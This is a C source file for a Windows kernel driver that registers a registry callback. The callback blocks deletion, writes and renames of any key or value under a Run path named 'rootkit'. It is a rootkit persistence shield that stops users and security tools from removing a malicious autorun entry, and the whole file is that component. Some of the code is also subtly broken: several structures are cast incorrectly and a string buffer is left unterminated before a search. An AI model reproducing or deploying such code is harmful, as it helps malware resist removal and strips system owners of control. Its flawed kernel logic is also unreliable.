#include "RProtect.h"

#define REG_PROTECT_KEY L"\\Run\\rootkit"
#define REG_PROTECT_DIR L"\\Run\\rootkit"
LARGE_INTEGER Cookie;

NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT pDriver_Obj,
	_In_ UNICODE_STRING RegPath
)
{
	UNREFERENCED_PARAMETER(RegPath);
	NTSTATUS Status = STATUS_SUCCESS;
	pDriver_Obj->DriverUnload = UnloadDriver;
	Status = CmRegisterCallback(
		RegistryCallback, NULL, &Cookie);
	return Status;
}

BOOLEAN GetNameForRegistryObject(
	_Out_	 PUNICODE_STRING pRegistryPath,
	_In_	 PUNICODE_STRING pPartialRegistryPath,
	_In_	 PVOID pRegistryObject
)
{
	UNREFERENCED_PARAMETER(pPartialRegistryPath);
	BOOLEAN ret = FALSE;
	if ((!MmIsAddressValid(pRegistryObject)) || (!pRegistryObject))
		return ret;
	else
	{
		NTSTATUS Status = STATUS_SUCCESS;
		ULONG ReturnLen = 0;
		POBJECT_NAME_INFORMATION NameInfo = NULL;
		Status = ObQueryNameString(
			pRegistryObject,
			NameInfo, 0,
			&ReturnLen);
		if (Status == STATUS_INFO_LENGTH_MISMATCH)
		{
			NameInfo = ExAllocatePoolWithTag(
				NonPagedPool, ReturnLen, REG_TAG);
			if (NameInfo)
			{
				Status = ObQueryNameString(
					pRegistryObject,
					NameInfo,
					ReturnLen,
					&ReturnLen);
				if (NT_SUCCESS(Status))
				{
					ret = TRUE;
					RtlCopyUnicodeString(pRegistryPath, &(NameInfo->Name));
				}
				ExFreePoolWithTag(NameInfo, REG_TAG);
			}
			else
				ret = FALSE;
		}
	}
	return ret;
}

NTSTATUS UnloadDriver(
	_In_ PDRIVER_OBJECT pDriver_Obj
)
{
	UNREFERENCED_PARAMETER(pDriver_Obj);
	NTSTATUS Status = STATUS_SUCCESS;
	CmUnRegisterCallback(Cookie);
	return Status;
}

NTSTATUS RegistryCallback(
	_In_ PVOID CallbackContext,
	_In_ PVOID Argument1,
	_In_ PVOID Argument2
)
{
	UNREFERENCED_PARAMETER(CallbackContext);
	NTSTATUS Status = STATUS_SUCCESS;
	UNICODE_STRING RegPath;
	RegPath.Length = 0;
	RegPath.MaximumLength = sizeof(WCHAR) * 0x800;
	RegPath.Buffer = ExAllocatePoolWithTag(
		NonPagedPool,
		RegPath.MaximumLength,
		REG_TAG
	);
	if (!RegPath.Buffer)
		return Status;
	LONG Type = (REG_NOTIFY_CLASS)Argument1;
	switch (Type)
	{
	//键删除保护
	case RegNtPreDeleteValueKey:
		GetNameForRegistryObject(
			&RegPath,
			NULL,
			((PREG_DELETE_KEY_INFORMATION)Argument2)->Object
		);
		PUNICODE_STRING ValueKey = ((PREG_DELETE_VALUE_KEY_INFORMATION)Argument2)->ValueName;
		RtlAppendUnicodeToString(&RegPath, L"\\");
		RtlAppendUnicodeStringToString(&RegPath, ValueKey);
		//DbgPrint("[RegProtect]keyvalue: %ws", RegPath.Buffer);
		if (wcsstr(RegPath.Buffer, REG_PROTECT_KEY))
			Status = STATUS_ACCESS_DENIED;
		break;
	//子项删除保护
	case RegNtPreDeleteKey:
		GetNameForRegistryObject(
			&RegPath,
			NULL,
			((PREG_DELETE_KEY_INFORMATION)Argument2)->Object
		);
		//DbgPrint("[RegProtect]key: %ws", RegPath.Buffer);
		if (wcsstr(RegPath.Buffer, REG_PROTECT_DIR))
			Status = STATUS_ACCESS_DENIED;
		break;
	//键值写保护
	case RegNtPreSetValueKey:
		GetNameForRegistryObject(
			&RegPath,
			NULL,
			((PREG_DELETE_KEY_INFORMATION)Argument2)->Object
		);
		PUNICODE_STRING ValueKey2 = ((PREG_DELETE_VALUE_KEY_INFORMATION)Argument2)->ValueName;
		RtlAppendUnicodeToString(&RegPath, L"\\");
		RtlAppendUnicodeStringToString(&RegPath, ValueKey2);
		//DbgPrint("[RegProtect]keyvalue: %ws", RegPath.Buffer);
		if (wcsstr(RegPath.Buffer, REG_PROTECT_KEY))
			Status = STATUS_ACCESS_DENIED;
		break;
	//子项重命名保护
	case RegNtPreRenameKey:
			GetNameForRegistryObject(
				&RegPath,
				NULL,
				((PREG_DELETE_KEY_INFORMATION)Argument2)->Object
			);
			PUNICODE_STRING ValueKey3 = ((PREG_DELETE_VALUE_KEY_INFORMATION)Argument2)->ValueName;
			RtlAppendUnicodeToString(&RegPath, L"\\");
			RtlAppendUnicodeStringToString(&RegPath, ValueKey3);
			//DbgPrint("[RegProtect]keyvalue: %ws", RegPath.Buffer);
			if (wcsstr(RegPath.Buffer, REG_PROTECT_KEY))
				Status = STATUS_ACCESS_DENIED;
			break;
	default:
		break;
	}
	ExFreePoolWithTag(RegPath.Buffer, REG_TAG);
	return Status;
}